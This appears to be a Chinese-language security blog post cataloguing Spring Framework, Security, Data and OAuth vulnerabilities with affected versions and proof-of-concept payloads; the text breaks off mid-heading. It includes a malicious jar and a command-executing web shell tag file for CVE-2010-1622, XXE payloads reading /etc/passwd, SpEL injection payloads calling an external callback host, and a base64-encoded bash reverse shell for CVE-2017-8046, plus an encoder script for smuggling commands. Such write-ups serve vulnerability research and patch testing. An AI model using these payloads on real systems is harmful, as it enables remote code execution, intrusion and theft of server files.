    <content type="html"><![CDATA[<p>虽说是Spring框架漏洞，但以下包含并不仅Spring Framework，Spring Boot，还有Spring Cloud，Spring Data，Spring Security等。</p><h3 id="CVE-2010-1622-Spring-Framework-class-classLoader类远程代码执行"><a href="#CVE-2010-1622-Spring-Framework-class-classLoader类远程代码执行" class="headerlink" title="CVE-2010-1622 Spring Framework class.classLoader类远程代码执行"></a>CVE-2010-1622 Spring Framework class.classLoader类远程代码执行</h3><p>影响版本：SpringSource Spring Framework 3.0.0 - 3.0.2、SpringSource Spring Framework 2.5.0 - 2.5.7</p><p>Spring框架提供了一种机制，该机制使用客户端提供的数据来更新对象属性。这个机制允许攻击者修改用于加载对象的类加载器的属性（通过’class.classloader’）。这可能导致任意命令执行，例如，攻击者可以修改URL。由类加载器用来指向攻击者控制的位置。</p><pre class="line-numbers language-none"><code class="language-none">示例：POST &#x2F;adduser HTTP&#x2F;1.0...firstName &#x3D; Tavis&amp;lastName &#x3D; Ormandy如果Person是表单的支持对象，则firstName和lastName属性将设置为相应的值。为了支持更复杂的类，Spring还支持点表示法，因此user.address.street &#x3D; Disclosure + Str。将等效于：frmObj.getUser().getAddress().setStreet(&quot;Disclosure Str.&quot;)  问题是Spring Beans的CachedIntrospectionResults类枚举了可从用户表单提交中设置的属性，使用  java.beans.Introspector.getBeanInfo()而不指定停止类，这意味着&#39; class &#39;属性及其后的所有内容均可用于HTTP请求中的设置。攻击如果攻击者使用以下HTTP参数向表单控制器提交HTTP请求：POST &#x2F;adduser HTTP&#x2F;1.0...class.classLoader.URLs[0] &#x3D; jar:http:&#x2F;&#x2F;attacker&#x2F;spring-exploit.jar!她将 使用自己的网址覆盖frmObj.getClass().getClassLoader().getURLs() 返回的数组中的第0个元素.它将是哪个类加载器？在Apache Tomcat上的情况下，它指org.apache.catalina.loader.WebappClassLoader<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如何构造这个jar，需要包含以下信息：</p><pre class="line-numbers language-none"><code class="language-none">- META-INF&#x2F;spring-form.tld - 定义spring表单标签并指定实现为标签文件而不是类- META-INF&#x2F;tags&#x2F;中的标签文件，包含有标签定义（任意Java代码）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>/META-INF/spring-form.tld文件：</p><pre class="line-numbers language-none"><code class="language-none">&lt;!-- &lt;form:input&#x2F;&gt; tag --&gt;&lt;tag-file&gt;    &lt;name&gt;input&lt;&#x2F;name&gt;    &lt;path&gt;&#x2F;META-INF&#x2F;tags&#x2F;InputTag.tag&lt;&#x2F;path&gt;  &lt;&#x2F;tag-file&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>/META-INF/tags/InputTag.tag</p><pre class="line-numbers language-none"><code class="language-none">&lt;%@ tag dynamic-attributes&#x3D;&quot;dynattrs&quot; %&gt;&lt;% j java.lang.Runtime.getRuntime().exec(&quot;mkdir &#x2F;tmp&#x2F;PWNED&quot;); %&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>做出这样的替换后，当开发者在controller中将任何一个对象绑定表单，并且最终展示的jsp内容有下面这些：</p><pre class="line-numbers language-none"><code class="language-none">&lt;%@ taglib prefix&#x3D;&quot;form&quot; uri&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;tags&#x2F;form&quot;%&gt;  &lt;form:form commandName&#x3D;&quot;user&quot;&gt;&lt;form:input path&#x3D;&quot;name&quot;&#x2F;&gt;&lt;&#x2F;form:form&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>攻击者访问url,即可触发远程代码执行的效果:</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;inbreak.net&#x2F;springmvc&#x2F;testjsp.htm? class.classLoader.URLs[0]&#x3D;jar:https:&#x2F;&#x2F;inbreak.net&#x2F;spring-exploit.jar!&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果服务器大于tomcat6.0.28版本，这样做会把所有的input标签替换掉，导致不能正常显示。需要修改</p><p>spring-form.tld，给其中的inputtag改名，name改为inputkxlzx：</p><pre class="line-numbers language-none"><code class="language-none">&lt;tag&gt;&lt;name&gt;inputkxlzx&lt;&#x2F;name&gt;  &#x2F;&#x2F;什么名字都行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在文件中新加入一个tag，叫做input：</p><pre class="line-numbers language-none"><code class="language-none">&lt;tag-file&gt;    &lt;name&gt;input&lt;&#x2F;name&gt;    &lt;path&gt;&#x2F;WEB-INF&#x2F;tags&#x2F;InputTag.tag&lt;&#x2F;path&gt;  &lt;&#x2F;tag-file&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>InputTag.tag的内容：</p><pre class="line-numbers language-none"><code class="language-none">&lt;%@ tag dynamic-attributes&#x3D;&quot;dynattrs&quot; %&gt;&lt;%if (request.getParameter(&quot;kxlzxcmd&quot;)!&#x3D;null) exec(request.getParameter(&quot;kxlzxcmd&quot;)); %&gt;&lt;form:inputkxlzx path&#x3D;&quot;$&#123;dynattrs.path&#125;&quot;&gt;&lt;&#x2F;form:inputkxlzx&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问的时候需要在参数中携带kxlzxcmd</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;test.htm?name&#x3D;kxlzx&amp;kxlzxcmd&#x3D;calc   &#x2F;&#x2F;包含input的页面<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="http://blog.o0o.nu/2010/06/cve-2010-1622.html">http://blog.o0o.nu/2010/06/cve-2010-1622.html</a></p><p><a href="https://www.inbreak.net/archives/377">https://www.inbreak.net/archives/377</a></p><h3 id="CVE-2013-4152-Spring-Framework中的XML外部实体（XXE）注入"><a href="#CVE-2013-4152-Spring-Framework中的XML外部实体（XXE）注入" class="headerlink" title="CVE-2013-4152 Spring Framework中的XML外部实体（XXE）注入"></a>CVE-2013-4152 Spring Framework中的XML外部实体（XXE）注入</h3><p>影响版本：3.0.0至3.2.3、4.0.0.M1</p><p>受影响版本容易受到XML外部实体（XXE）注入的攻击。该<code>SourceHttpMessageConverter</code>处理器不会禁用外部实体解析，这使远程攻击者可以读取任意文件。</p><p>当传输xml结构体时，如</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="ISO-8859-1"?></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>John<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>xml</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>外部XML实体- <code>xxe</code>是使用系统标识符定义的，并存在于DOCTYPE标头中。这些实体可以访问本地或远程内容。例如，以下代码包含一个外部XML实体，该实体将获取的内容 <code>/etc/passwd</code>并将其显示给呈现给用户。</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="ISO-8859-1"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">foo</span> <span class="token punctuation">[</span><span class="token internal-subset">   &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>xml</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其他XXE注入攻击可以访问可能无法停止返回数据的本地资源，这可能会影响应用程序可用性并导致拒绝服务。</p><h3 id="CVE-2013-7315-Spring-Framework中的XML外部实体"><a href="#CVE-2013-7315-Spring-Framework中的XML外部实体" class="headerlink" title="CVE-2013-7315 Spring Framework中的XML外部实体"></a>CVE-2013-7315 Spring Framework中的XML外部实体</h3><p>影响版本：3.2.0至3.2.3、4.0.0.M1-4.0.0.M2（Spring MVC）</p><p>由于对 <strong>CVE-2013-4152</strong>和<strong>CVE-2013-6429的</strong>修复不完整导致。</p><p>受影响版本容易受到XML外部实体（XXE）注入的攻击。该<code>SourceHttpMessageConverter</code>处理器不会禁用外部实体解析，这使远程攻击者可以读取任意文件。</p><p>当传输xml结构体时，如</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="ISO-8859-1"?></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>John<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>xml</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>外部XML实体- <code>xxe</code>是使用系统标识符定义的，并存在于DOCTYPE标头中。这些实体可以访问本地或远程内容。例如，以下代码包含一个外部XML实体，该实体将获取的内容 <code>/etc/passwd</code>并将其显示给呈现给用户。</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="ISO-8859-1"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">foo</span> <span class="token punctuation">[</span><span class="token internal-subset">   &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>xml</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其他XXE注入攻击可以访问可能无法停止返回数据的本地资源，这可能会影响应用程序可用性并导致拒绝服务。</p><h3 id="CVE-2014-3527-Spring-Security验证绕过漏洞"><a href="#CVE-2014-3527-Spring-Security验证绕过漏洞" class="headerlink" title="CVE-2014-3527 Spring Security验证绕过漏洞"></a>CVE-2014-3527 Spring Security验证绕过漏洞</h3><p>影响版本：</p><pre class="line-numbers language-none"><code class="language-none">SpringSource Spring Security 3.1-3.2.4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">当使用从Spring Security 3.1到3.2.4的CAS代理票证身份验证时，恶意的CAS服务可能会欺骗另一个CAS服务来认证未关联的代理票证。这是由于以下事实：代理票证身份验证使用了来自HttpServletRequest的信息，该信息是根据HTTP请求中的不可信信息填充的。这意味着，如果存在CAS服务可以相互认证的访问控制限制，则可以绕过这些限制。如果用户未使用CAS代理票证，并且未基于CAS服务做出访问控制决策，则对用户没有影响。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="CVE-2014-0097-Spring-Security认证绕过"><a href="#CVE-2014-0097-Spring-Security认证绕过" class="headerlink" title="CVE-2014-0097 Spring Security认证绕过"></a>CVE-2014-0097 Spring Security认证绕过</h3><p>影响版本：Spring Security 3.2.0至3.2.1和3.1.0至3.1.5</p><pre class="line-numbers language-none"><code class="language-none">ActiveDirectoryLdapAuthenticator不检查密码长度。如果目录允许匿名绑定，则它可能会错误地验证提供空密码的用户。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="CVE-2014-3578-Spring-Framework-目录遍历漏洞"><a href="#CVE-2014-3578-Spring-Framework-目录遍历漏洞" class="headerlink" title="CVE-2014-3578 Spring Framework 目录遍历漏洞"></a>CVE-2014-3578 Spring Framework 目录遍历漏洞</h3><p>影响版本：</p><pre class="line-numbers language-none"><code class="language-none">Spring Framework:- 3.0.4 to 3.2.11- 4.0.0 to 4.0.7- 4.1.0 to 4.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在web.xml存在如下情况下存在目录遍历：</p><pre class="line-numbers language-none"><code class="language-none">&lt;mvc:resources mapping&#x3D;&quot;&#x2F;css&#x2F;**&quot; location&#x3D;&quot;file:webapps&#x2F;springapp&#x2F;WEB-INF&#x2F;classes&#x2F;theme&#x2F;css&#x2F;&quot; &#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问：</p><pre class="line-numbers language-none"><code class="language-none">GET &#x2F;springapp&#x2F;css&#x2F;file:&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="CVE-2016-2173-Spring-AMQP中的远程代码执行"><a href="#CVE-2016-2173-Spring-AMQP中的远程代码执行" class="headerlink" title="CVE-2016-2173 Spring AMQP中的远程代码执行"></a>CVE-2016-2173 Spring AMQP中的远程代码执行</h3><p>影响版本：1.0.0至1.5.4</p><p><a href="https://github.com/HaToan/CVE-2016-2173">https://github.com/HaToan/CVE-2016-2173</a></p><p>使用方式：</p><pre class="line-numbers language-none"><code class="language-none">- ysoserial-0.0.4-all.jar create payload write and execute a shell+ java -jar ysoserial-0.0.4-all.jar &#39;library_vul&#39; &#39;command&#39;- exploit-cve2016-2173.jar : send to App vul+ java -jar exploit-cve2016-2173.jar <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本来想根据配置来搭一个环境处理，结果环境一直搭不起来，构建各种失败，就先放这个利用poc把。</p><h3 id="CVE-2016-4977-SpringSecurityOauth-远程命令执行漏洞"><a href="#CVE-2016-4977-SpringSecurityOauth-远程命令执行漏洞" class="headerlink" title="CVE-2016-4977 SpringSecurityOauth 远程命令执行漏洞"></a>CVE-2016-4977 SpringSecurityOauth 远程命令执行漏洞</h3><p>影响版本：2.0.0-2.0.9、1.0.0-1.0.5</p><p><a href="https://www.seebug.org/vuldb/ssvid-92474">https://www.seebug.org/vuldb/ssvid-92474</a></p><p>漏洞利用POC：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;localhost:8080&#x2F;oauth&#x2F;authorize?response_type&#x3D;token&amp;client_id&#x3D;acme&amp;redirect_uri&#x3D;$&#123;2334-1&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131645.png" alt="image-20200331090423266"></p><p>执行命令：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;207.246.79.196:8080&#x2F;oauth&#x2F;authorize?response_type&#x3D;token&amp;client_id&#x3D;acme&amp;redirect_uri&#x3D;$&#123;T(java.lang.Runtime).getRuntime().exec(%22ping%20xxx.ceye.io%22)&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131647.png" alt="image-20200331092210362"></p><p>但是此命令执行，不会在页面上显示，只会打印出运行的对象。</p><p>如果要执行反弹shell等命令，由于页面HTML编码的原因，SPEL返回值时进行了一次html编码，所以导致取出的  值时会进行一次转义，利用如下脚本加工。</p><pre class="line-numbers language-none"><code class="language-none">#coding:utf-8message &#x3D; input(&#39;Enter message to encode:&#39;) print(&#39;Decoded string (in ASCII):\n&#39;) print(&#39;T(java.lang.Character).toString(%s)&#39; % ord(message[0]), end&#x3D;&quot;&quot;)for ch in message[1:]:   print(&#39;.concat(T(java.lang.Character).toString(%s))&#39; % ord(ch), end&#x3D;&quot;&quot;), print(&#39;\n&#39;) print(&#39;new java.lang.String(new byte[]&#123;&#39;, end&#x3D;&quot;&quot;),print(ord(message[0]), end&#x3D;&quot;&quot;)for ch in message[1:]:   print(&#39;,%s&#39; % ord(ch), end&#x3D;&quot;&quot;), print(&#39;)&#125;&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行输出后再添加：</p><pre class="line-numbers language-none"><code class="language-none">T(java.lang.Runtime).getRuntime().exec(payload)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="CNVD-2016-04742-Spring-Boot框架SPEL表达式注入漏洞"><a href="#CNVD-2016-04742-Spring-Boot框架SPEL表达式注入漏洞" class="headerlink" title="CNVD-2016-04742 Spring Boot框架SPEL表达式注入漏洞"></a>CNVD-2016-04742 Spring Boot框架SPEL表达式注入漏洞</h3><p>影响版本：1.1.0-1.1.12、1.2.0-1.2.7、1.3.0</p><p><a href="https://www.cnblogs.com/litlife/p/10183137.html">https://www.cnblogs.com/litlife/p/10183137.html</a></p><p>下载存在漏洞的版本1.3.0：<a href="https://github.com/spring-projects/spring-boot/archive/v1.3.0.RELEASE.zip">https://github.com/spring-projects/spring-boot/archive/v1.3.0.RELEASE.zip</a></p><p>POC：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?payload&#x3D;$&#123;new%20java.lang.String(new%20byte[]&#123;70, 66, 66, 50, 48, 52, 65, 52, 48, 54, 49, 70, 70, 66, 68, 52, 49, 50, 56, 52, 65, 56, 52, 67, 50, 53, 56, 67, 49, 66, 70, 66&#125;)&#125;结果：FBB204A4061FFBD41284A84C258C1BFB返回结果是md5(wooyun)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="CVE-2016-6652-Spring-Data-JPA-SQL盲注"><a href="#CVE-2016-6652-Spring-Data-JPA-SQL盲注" class="headerlink" title="CVE-2016-6652 Spring Data JPA SQL盲注"></a>CVE-2016-6652 Spring Data JPA SQL盲注</h3><p>影响版本：Spring Data JPA 1.10.2、1.9.4</p><p><a href="https://www.seebug.org/vuldb/ssvid-92534">https://www.seebug.org/vuldb/ssvid-92534</a></p><h3 id="CVE-2017-4971-Spring-WebFlow-远程代码执行漏洞"><a href="#CVE-2017-4971-Spring-WebFlow-远程代码执行漏洞" class="headerlink" title="CVE-2017-4971 Spring WebFlow 远程代码执行漏洞"></a>CVE-2017-4971 Spring WebFlow 远程代码执行漏洞</h3><p>影响版本：Spring Web Flow 2.4.0 to 2.4.4</p><p>使用vulhub搭建环境后，在添加poc执行</p><pre class="line-numbers language-none"><code class="language-none">&amp;_(new+java.lang.ProcessBuilder(&quot;ping&quot;,&quot;xxx.ceye.io&quot;)).start()&#x3D;vulhub<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131651.png" alt="image-20200331111056698"></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131653.png" alt="image-20200331111146008"></p><p>无害化payload检测，如果 response header 中出现 vulnerable 头，则有漏洞：</p><pre class="line-numbers language-none"><code class="language-none">&amp;_T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getResponse().addHeader(&quot;vulnerable&quot;,&quot;True&quot;).aaa&#x3D;n1nty<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131655.png" alt="image-20200331111225481"></p><h3 id="CVE-2017-8045-Spring-Amqp中的远程代码执行"><a href="#CVE-2017-8045-Spring-Amqp中的远程代码执行" class="headerlink" title="CVE-2017-8045 Spring Amqp中的远程代码执行"></a>CVE-2017-8045 Spring Amqp中的远程代码执行</h3><p>影响版本：1.7.4、1.6.11和1.5.7之前的Spring AMQP版本</p><p><a href="https://xz.aliyun.com/t/36">https://xz.aliyun.com/t/36</a></p><h3 id="CVE-2017-8046-Spring-Data-REST-PATCH请求远程执行代码"><a href="#CVE-2017-8046-Spring-Data-REST-PATCH请求远程执行代码" class="headerlink" title="CVE-2017-8046 Spring Data REST PATCH请求远程执行代码"></a>CVE-2017-8046 Spring Data REST PATCH请求远程执行代码</h3><p>影响版本：Spring Data REST 2.5.12, 2.6.7, 3.0 RC3之前的版本、Spring Data release trains Kay-RC3之前的版本、Spring Boot 2.0.0M4之前的版本</p><p><a href="https://www.cnblogs.com/co10rway/p/9380441.html">https://www.cnblogs.com/co10rway/p/9380441.html</a></p><p>利用POC执行：</p><pre class="line-numbers language-none"><code class="language-none">[&#123; &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(&#39;ping xxx.ceye.io&#39;))&#x2F;lastname&quot;, &quot;value&quot;: &quot;vulhub&quot; &#125;]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>反弹shell，其中反弹shell命令需要借助编码来减少重定向出错的问题<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">java.lang.Runtime.exec() Payload Workarounds</a>：</p><pre class="line-numbers language-none"><code class="language-none">[&#123; &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(&#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94LngueC54Lzg4OTkgMD4mMQ&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;))&#x2F;lastname&quot;, &quot;value&quot;: &quot;vulhub&quot; &#125;]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131657.png" alt="image-20200331114458798"></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131700.png" alt="image-20200331115328723"></p><h3 id="CVE-2018-1258-Spring-Security未经授权的访问"><a href="#CVE-2018-1258-Spring-Security未经授权的访问" class="headerlink" title="CVE-2018-1258 Spring Security未经授权的访问"></a>CVE-2018-1258 Spring Security未经授权的访问</h3><p>影响版本：Spring Framework 5.0.5.RELEASE和Spring Security（任何版本）</p><p>暂无详细信息</p><h3 id="CVE-2018-1259-具有XMLBeam的Spring-DataXXE"><a href="#CVE-2018-1259-具有XMLBeam的Spring-DataXXE" class="headerlink" title="CVE-2018-1259 具有XMLBeam的Spring DataXXE"></a>CVE-2018-1259 具有XMLBeam的Spring DataXXE</h3><p>影响版本：</p><pre class="line-numbers language-none"><code class="language-none">XMLBeam 1.4.14或更早版本结合使用的Spring Data CommonsSpring Data Commons 1.13至1.13.11（Ingalls SR11）Spring Data REST 2.6至2.6.11（Ingalls SR11）Spring Data Commons 2.0至2.0.6（Kay SR6）Spring Data REST 3.0至3.0.6（Kay SR6）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="http://www.polaris-lab.com/index.php/tag/CVE-2018-1259/">http://www.polaris-lab.com/index.php/tag/CVE-2018-1259/</a></p><p><a href="https://xz.aliyun.com/t/2341">https://xz.aliyun.com/t/2341</a></p><h3 id="CVE-2018-1270-Spring-Messaging远程代码执行漏洞"><a href="#CVE-2018-1270-Spring-Messaging远程代码执行漏洞" class="headerlink" title="CVE-2018-1270 Spring Messaging远程代码执行漏洞"></a>CVE-2018-1270 Spring Messaging远程代码执行漏洞</h3><p>影响版本：Spring Framework 5.0 to 5.0.4。Spring Framework 4.3 to 4.3.14</p><p>同样利用vulhub搭建环境，首先我们先拦截connect，查看通过的ws包，点击后会有这么一个请求</p><pre class="line-numbers language-none"><code class="language-none">ws:&#x2F;&#x2F;x.x.x.x:8080&#x2F;gs-guide-websocket&#x2F;845&#x2F;beqcexeb&#x2F;websocket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131702.png" alt="image-20200331163229079"></p><p>从bp中看到来回四个包，其中的内容为如上所示，修改如下请求包</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131704.png" alt="image-20200331170304494"></p><p>在发送任意消息，即可触发</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131707.png" alt="image-20200331170357879"></p><p>或者尝试使用vulhub提供的脚本，但是此脚本并不具备通用性，需要修改使用<a href="https://github.com/vulhub/vulhub/blob/master/spring/CVE-2018-1270/exploit.py">poc</a></p><h3 id="CVE-2018-1271-Spring-MVC-目录穿越漏洞"><a href="#CVE-2018-1271-Spring-MVC-目录穿越漏洞" class="headerlink" title="CVE-2018-1271 Spring MVC 目录穿越漏洞"></a>CVE-2018-1271 Spring MVC 目录穿越漏洞</h3><p>当Spring MVC的静态资源存放在Windows系统上时，攻击可以通过构造特殊URL导致目录遍历漏洞。</p><p>此漏洞触发条件较高：</p><ol><li> Server运行于Windows系统上</li><li> 从文件系统提供的文件服务（比如使用file协议，但不是file open）</li><li> 没有使用CVE-2018-1199漏洞的补丁</li><li> 不使用Tomcat或者是WildFly做Server</li></ol><p>漏洞利用和复现: </p><p><a href="https://blog.knownsec.com/2018/08/spring-mvc-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9Ecve-2018-1271%E5%88%86%E6%9E%90/">https://blog.knownsec.com/2018/08/spring-mvc-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9Ecve-2018-1271%E5%88%86%E6%9E%90/</a></p><h3 id="CVE-2018-1273-Spring-Expression-Language-SPEL表达式注入漏洞"><a href="#CVE-2018-1273-Spring-Expression-Language-SPEL表达式注入漏洞" class="headerlink" title="CVE-2018-1273 Spring Expression Language SPEL表达式注入漏洞"></a>CVE-2018-1273 Spring Expression Language SPEL表达式注入漏洞</h3><p>影响版本：</p><pre class="line-numbers language-none"><code class="language-none">Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10)Spring Data REST 2.6 - 2.6.10 (Ingalls SR10)Spring Data Commons 2.0 to 2.0.5 (Kay SR5)Spring Data REST 3.0 - 3.0.5 (Kay SR5)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.cnblogs.com/hac425/p/9656747.html">https://www.cnblogs.com/hac425/p/9656747.html</a></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131709.png" alt="image-20200331171801189"></p><p>POC：</p><pre class="line-numbers language-none"><code class="language-none">username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc.exe&quot;)]&#x3D;xxxusername[T(java.lang.Runtime).getRuntime().exec(&quot;ping+xxx.ceye.io&quot;)]&#x3D;test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="CVE-2018-1260-Spring-Security-Oauth2-远程代码执行"><a href="#CVE-2018-1260-Spring-Security-Oauth2-远程代码执行" class="headerlink" title="CVE-2018-1260 Spring Security Oauth2 远程代码执行"></a>CVE-2018-1260 Spring Security Oauth2 远程代码执行</h3><p>影响版本：</p><pre class="line-numbers language-none"><code class="language-none">Spring Security OAuth 2.3 to 2.3.2Spring Security OAuth 2.2 to 2.2.1Spring Security OAuth 2.1 to 2.1.1Spring Security OAuth 2.0 to 2.0.14<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.seebug.org/vuldb/ssvid-97287">https://www.seebug.org/vuldb/ssvid-97287</a></p><p>此漏洞和CVE-2016-4977类似</p><p>POC：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;localhost:8080&#x2F;oauth&#x2F;authorize?client_id&#x3D;client&amp;response_type&#x3D;code&amp;redirect_uri&#x3D;http:&#x2F;&#x2F;www.baidu.com&amp;scope&#x3D;%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22ping%20r9rub4.ceye.io%22%29%7D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="CVE-2018-15758-spring-security-oauth2权限提升"><a href="#CVE-2018-15758-spring-security-oauth2权限提升" class="headerlink" title="CVE-2018-15758 spring-security-oauth2权限提升"></a>CVE-2018-15758 spring-security-oauth2权限提升</h3><p>影响版本：</p><pre class="line-numbers language-none"><code class="language-none">Spring Security OAuth 2.3至2.3.3Spring Security OAuth 2.2至2.2.2Spring Security OAuth 2.1至2.1.2Spring Security OAuth 2.0到2.0.15<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>使用了EnableResourceServer并且用了<code>AuthorizationRequest</code>的话。那么攻击者可以重新发送一次用过的验证请求，或者进行相应参数修改，从而造成权限提升。</p><p>例如劫持code，并且篡改其中的scope到all的话：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;localhost:8080&#x2F;oauth&#x2F;authorize?client_id&#x3D;client&amp;response_type&#x3D;code&amp;redirect_uri&#x3D;http:&#x2F;&#x2F;127.0.0.1&amp;scope&#x3D;openid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131712.png" alt="image-20200401094048949"></p><p>即授权了读取权限的时候，修改为all就可以获得全部权限。</p><h3 